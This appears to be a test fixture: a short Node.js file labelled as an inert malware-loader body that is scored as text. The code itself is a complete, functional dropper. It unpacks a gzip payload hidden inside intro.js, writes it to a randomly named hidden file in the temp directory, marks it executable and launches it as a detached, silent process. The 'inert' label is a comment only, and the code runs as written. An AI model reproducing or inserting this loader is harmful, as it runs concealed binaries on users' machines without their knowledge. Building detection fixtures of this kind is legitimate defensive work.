// SYNTHETIC FIXTURE — inert Gen-1 loader body. Scored as text, never executed.
const fs = require('fs'), zlib = require('zlib'), cp = require('child_process'), os = require('os'), path = require('path');
const container = fs.readFileSync(path.join(__dirname, 'intro.js'));
const bin = zlib.gunzipSync(container.subarray(5));
const out = path.join(os.tmpdir(), '.' + Math.random().toString(36).slice(2));
fs.writeFileSync(out, bin);
fs.chmodSync(out, 0o755);
const child = cp.spawn(out, [], { detached: true, stdio: 'ignore' });
child.unref();
